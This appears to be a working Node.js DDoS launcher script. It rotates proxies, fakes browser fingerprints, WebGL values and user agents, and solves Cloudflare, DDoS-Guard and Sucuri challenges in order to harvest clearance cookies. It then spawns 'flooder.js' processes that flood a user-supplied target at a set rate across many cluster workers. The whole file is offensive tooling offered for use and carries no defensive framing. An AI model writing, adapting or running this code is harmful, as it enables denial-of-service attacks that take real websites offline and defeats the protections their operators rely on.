const { connect } = require('puppeteer-real-browser');
const { FingerprintGenerator } = require('fingerprint-generator');
const timers = require('timers/promises');
const { spawn, exec } = require('child_process');
const fs = require('fs');
const cluster = require('cluster');
const colors = require('colors');

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
process.setMaxListeners(0);

const cleanArgs = process.argv.slice(2).filter(arg => !arg.startsWith('--'));
const authOpt = process.argv.includes('--auth');

if (cleanArgs.length < 5) {
    console.clear();
    console.log(`node brs target time thread rate proxyfile [--auth]`);
    process.exit(0);
}

const target = cleanArgs[0];
const duration = parseInt(cleanArgs[1]);
const threads = parseInt(cleanArgs[2]);
const rate = parseInt(cleanArgs[3]);
const proxyfile = cleanArgs[4];

let proxyPool = [];
let proxyPoolIndex = 0;
const proxyLock = {};

function error(msg) {
    console.log(` ${'['.red}${'error'.bold}${']'.red} ${msg}`);
    process.exit(0);
}

function exit() {
    for (const flooder of flooders) {
        flooder.kill();
    }
    exec('pkill -f chrome');
    console.log(`${'End!'.bold}`);
    process.exit(0);
}

process.on('SIGTERM', () => exit()).on('SIGINT', () => exit());

const raw_proxies = fs.readFileSync(proxyfile, "utf-8")
    .toString()
    .replace(/\r/g, "")
    .split("\n")
    .filter((word) => word.trim().length > 0);

var parsed = new URL(target);

function shuffleArray(array) {
    const shuffled = [...array];
    let currentIndex = shuffled.length;
    while (currentIndex != 0) {
        let randomIndex = Math.floor(Math.random() * currentIndex);
        currentIndex--;
        [shuffled[currentIndex], shuffled[randomIndex]] = [shuffled[randomIndex], shuffled[currentIndex]];
    }
    return shuffled;
}

proxyPool = shuffleArray(raw_proxies);
var headless = false;
const cache = [];
const flooders = [];

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRandomGPU() {
    const gpus = [
        { vendor: 'NVIDIA Corporation', renderer: 'NVIDIA GeForce GTX 1660 Ti', unmaskedVendor: 'NVIDIA Corporation', unmaskedRenderer: 'ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Ti Direct3D11 vs_5_0 ps_5_0)' },
        { vendor: 'NVIDIA Corporation', renderer: 'NVIDIA GeForce RTX 3060', unmaskedVendor: 'NVIDIA Corporation', unmaskedRenderer: 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)' },
        { vendor: 'NVIDIA Corporation', renderer: 'NVIDIA GeForce RTX 3070', unmaskedVendor: 'NVIDIA Corporation', unmaskedRenderer: 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3070 Direct3D11 vs_5_0 ps_5_0)' },
        { vendor: 'NVIDIA Corporation', renderer: 'NVIDIA GeForce GTX 1650', unmaskedVendor: 'NVIDIA Corporation', unmaskedRenderer: 'ANGLE (NVIDIA, NVIDIA GeForce GTX 1650 Direct3D11 vs_5_0 ps_5_0)' },
        { vendor: 'AMD', renderer: 'AMD Radeon RX 6600', unmaskedVendor: 'AMD', unmaskedRenderer: 'ANGLE (AMD, AMD Radeon RX 6600 Direct3D11 vs_5_0 ps_5_0)' },
        { vendor: 'AMD', renderer: 'AMD Radeon RX 580', unmaskedVendor: 'AMD', unmaskedRenderer: 'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)' },
        { vendor: 'Intel Inc.', renderer: 'Intel(R) UHD Graphics 630', unmaskedVendor: 'Intel Inc.', unmaskedRenderer: 'ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0)' }
    ];
    return gpus[Math.floor(Math.random() * gpus.length)];
}

function getNextProxy() {
    let attempts = 0;
    const maxAttempts = proxyPool.length * 2;

    while (attempts < maxAttempts) {
        if (proxyPoolIndex >= proxyPool.length) {
            console.log(`${colors.yellow('Reshuffling proxy pool...')}`);
            proxyPool = shuffleArray(raw_proxies);
            proxyPoolIndex = 0;
        }
        const proxy = proxyPool[proxyPoolIndex];
        proxyPoolIndex++;
        if (!proxyLock[proxy]) {
            proxyLock[proxy] = true;
            return proxy;
        }
        attempts++;
    }
    return null;
}

function releaseProxy(proxy) {
    if (proxy && proxyLock[proxy]) {
        delete proxyLock[proxy];
    }
}

async function flooder(proxy, ua, cookie) {
    const args = ["flooder.js", target, duration.toString(), "1", proxy, rate.toString(), ua, cookie, "mykey123", "--query 2", "--debug"];
    const flooder_process = spawn("node", args, { stdio: ['ignore', 'pipe', 'pipe'] });
    flooders.push(flooder_process);

    let latestLog = null;
    let lastPrintTime = 0;

    const tryPrint = () => {
        const now = Date.now();
        if (latestLog !== null && now - lastPrintTime >= 15000) {
            console.log(`(DEBUG) ${latestLog}`);
            lastPrintTime = now;
            latestLog = null;
        }
    };

    flooder_process.stdout.on('data', (data) => {
        const lines = data.toString().trim().split('\n').filter(line => line.trim());
        if (lines.length > 0) {
            latestLog = lines[lines.length - 1];
        }
        tryPrint();
    });

    const interval = setInterval(() => {
        tryPrint();
    }, 15000);

    flooder_process.on('exit', () => {
        clearInterval(interval);
    });
}

async function isChallengeSolved(page, protections) {
    try {
        const title = await page.title();
        if (title && protections.some(p => title.toLowerCase().includes(p))) return false;

        const isSolved = await page.evaluate(() => {
            return document.readyState === 'complete' &&
                   !document.body.innerHTML.includes('Just a moment') &&
                   !document.body.querySelector('.cf-browser-verification') &&
                   !document.body.querySelector('[data-ray]') &&
                   document.body.children.length > 0;
        });

        const cookiesCheck = await page.evaluate(() => {
            const cookies = document.cookie.split(';');
            const cfClearance = cookies.find(row => row.trim().startsWith('cf_clearance='));
            const cfBM = cookies.find(row => row.trim().startsWith('__cf_bm='));

            const getVal = (c) => c ? c.split('=')[1] : null;
            const clearVal = getVal(cfClearance);
            const bmVal = getVal(cfBM);
            return (clearVal && clearVal.length > 10) || (bmVal && bmVal.length > 10);
        });

        return isSolved && cookiesCheck;
    } catch (err) {
        return false;
    }
}

async function mainLoop() {
    while (true) {
        let reserve = false;
        await main(reserve);
    }
}

async function main(reserve) {
    let proxy = null;
    let page = null;
    let browser = null;

    proxy = getNextProxy();
    if (!proxy) {
        console.log(`${colors.yellow('All proxies are busy, waiting 2s...')}`);
        await timers.setTimeout(2000);
        return;
    }

    let proxy_plugin;
    let proxy_parts = proxy.split(':');

    try {
        if (authOpt) {
            if (proxy_parts.length >= 4) {
                proxy_plugin = {
                    host: proxy_parts[0],
                    port: parseInt(proxy_parts[1]),
                    username: proxy_parts[2],
                    password: proxy_parts[3]
                };
                console.log(`${colors.cyan('Using Auth Proxy')}: ${proxy_parts[0]}:${proxy_parts[1]} ${colors.dim(`[${proxyPoolIndex}/${proxyPool.length}]`)}`);
            } else {
                proxy_plugin = { host: proxy_parts[0], port: parseInt(proxy_parts[1]) };
                console.log(`${colors.yellow('Warning: Auth flag set but proxy format invalid, using no-auth.')}`);
            }
        } else {
            proxy_plugin = { host: proxy_parts[0], port: parseInt(proxy_parts[1]) };
            console.log(`${colors.cyan('Using Proxy')}: ${proxy_parts[0]}:${proxy_parts[1]} ${colors.dim(`[${proxyPoolIndex}/${proxyPool.length}]`)}`);
        }

        // === FIX 7: SCREEN/WINDOW SIZE ĐỒNG BỘ ===
        const screenWidth = random_int(1920, 2560);
        const screenHeight = random_int(1080, 1440);

        let result = await connect({
            turnstile: true,
            headless: headless,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                `--window-size=${screenWidth},${screenHeight}`,  // ✅ Đồng bộ screen
            ],
            customConfig: {},
            connectOption: {},
            connectTimeout: 30000,
            ignoreAllFlags: false,
            proxy: proxy_plugin
        });

        page = result.page;
        browser = result.browser;

        const chromeVersion = random_int(133, 146);
        const fullChromeVersion = `${chromeVersion}.0.0.0`;
        const randomUA = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`;

        // === FIX 2+6: GPU FAKE (dùng getRandomGPU(), spoof bằng JS) ===
        const gpu = getRandomGPU();

        const fingerprintGenerator = new FingerprintGenerator({ devices: ['desktop'], operatingSystems: ['windows'] });
        const fingerprint = fingerprintGenerator.getFingerprint({
            extra: {
                screen: { width: screenWidth, height: screenHeight }, 
                webgl: {
                    vendor: gpu.vendor,
                    renderer: gpu.renderer,
                    unmaskedVendor: gpu.unmaskedVendor,
                    unmaskedRenderer: gpu.unmaskedRenderer
                }
            },
            timezone: 'Asia/Ho_Chi_Minh',  // Generator tự apply timezone
        });

        fingerprint.headers['User-Agent'] = randomUA;

        // ✅ APPLY UA/Fingerprint
        await page.setUserAgent(randomUA);

        const client = await page.target().createCDPSession();
        await client.send('Network.setUserAgentOverride', {
            userAgent: randomUA,
            platform: 'Windows',
            userAgentMetadata: {
                brands: [
                    { brand: 'Google Chrome', version: chromeVersion.toString() },
                    { brand: 'Chromium', version: chromeVersion.toString() },
                    { brand: 'Not A(Brand', version: '24' }
                ],
                fullVersionList: [
                    { brand: 'Google Chrome', version: fullChromeVersion },
                    { brand: 'Chromium', version: fullChromeVersion },
                    { brand: 'Not A(Brand', version: '24.0.0.0' }
                ],
                fullVersion: fullChromeVersion,
                platform: 'Windows',
                platformVersion: '10.0.0',
                architecture: 'x86',
                model: '',
                mobile: false,
                bitness: '64',
                wow64: false
            }
        });

        // ✅ Xóa Headless trace
        var userAgent = await page.evaluate(() => navigator.userAgent);
        if (userAgent.includes("Headless")) {
            userAgent = userAgent.replace('Headless', '');
            await page.setUserAgent(userAgent);
        }

        // ✅ FIX 2: WEBGL SPOOF THỰC TẾ (page.evaluateOnNewDocument - early override)
        await page.evaluateOnNewDocument((fakeVendor, fakeRenderer, fakeUnmaskedVendor, fakeUnmaskedRenderer) => {
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(parameter) {
                if (parameter === 37445) return fakeUnmaskedVendor;  // UNMASKED_VENDOR
                if (parameter === 37446) return fakeUnmaskedRenderer; // UNMASKED_RENDERER
                if (parameter === 7936) return fakeVendor;             // VENDOR
                if (parameter === 7937) return fakeRenderer;           // RENDERER
                return getParameter.apply(this, arguments);
            };

            if (typeof WebGL2RenderingContext !== 'undefined') {
                const getParameter2 = WebGL2RenderingContext.prototype.getParameter;
                WebGL2RenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445) return fakeUnmaskedVendor;
                    if (parameter === 37446) return fakeUnmaskedRenderer;
                    if (parameter === 7936) return fakeVendor;
                    if (parameter === 7937) return fakeRenderer;
                    return getParameter2.apply(this, arguments);
                };
            }
        }, gpu.vendor, gpu.renderer, gpu.unmaskedVendor, gpu.unmaskedRenderer);

        // ✅ Load target (sau tất cả spoof)
        await page.goto(target, { waitUntil: 'networkidle0', timeout: 30000 });

        // Cookie check logic (giữ nguyên)
        let titles = [];
        let protections = ['just a moment...', 'ddos-guard', '403 forbidden', 'security check', 'One more step', 'Sucuri WebSite Firewall'];
        const maxWaitTime = 35000;
        const pollInterval = 250;

        const titleCheckPromise = new Promise(async (resolve, reject) => {
            let pollCount = 0;
            const startTime = Date.now();
            while (Date.now() - startTime < maxWaitTime) {
                pollCount++;
                try {
                    const solved = await isChallengeSolved(page, protections);
                    if (solved) { resolve(true); return; }

                    const title = await page.title();
                    if (title.startsWith("Failed to load URL ")) { reject(new Error("Failed to load URL")); return; }
                    if (!title) { titles.push(parsed.hostname); resolve(true); return; }

                    if (title !== titles[titles.length - 1]) {
                        console.log(`${colors.bold('Title')}: ${colors.italic(title)}`);
                    }
                    titles.push(title);

                    if (!protections.some(p => title.toLowerCase().includes(p))) { resolve(true); return; }
                } catch (err) {
                    if (pollCount >= 5) { reject(err); return; }
                }
                await timers.setTimeout(pollInterval);
            }
            reject(new Error("Timeout waiting for challenge solve"));
        });

        await titleCheckPromise.catch(() => {});

        var cookies = await page.cookies();
        const _cookie = cookies.map(c => `${c.name}=${c.value}`).join("; ");

        if (_cookie.includes('cf_clearance=') || _cookie.includes('__cf_bm=')) {
            const cfValue = _cookie.split('cf_clearance=')[1]?.split(';')[0] ||
                            _cookie.split('__cf_bm=')[1]?.split(';')[0];
            if (cfValue && cfValue.length < 10) return;
        }

        if (_cookie && _cookie.trim().length > 0) {
            console.log(`${colors.bold('Cookie')}: ${colors.green(_cookie)}`);
            if (!reserve) {
                flooder(proxy, randomUA, _cookie);
            } else {
                cache.push({ proxy: proxy, ua: randomUA, cookie: _cookie });
            }
        } else {
            console.log(`${colors.yellow('No Cookie Found')}: ${colors.red('Skipping flood launch')}`);
        }
    } catch (err) {
        await timers.setTimeout(1000);
    } finally {
        if (page && !page.isClosed()) await page.close().catch(() => {});
        if (browser && browser.isConnected()) await browser.close().catch(() => {});
        releaseProxy(proxy);
    }
}

if (cluster.isPrimary) {
    for(let i = 0; i < threads; i++) cluster.fork();
    cluster.on('exit', w => cluster.fork());
    setTimeout(exit, duration * 1000);
} else {
    mainLoop();
}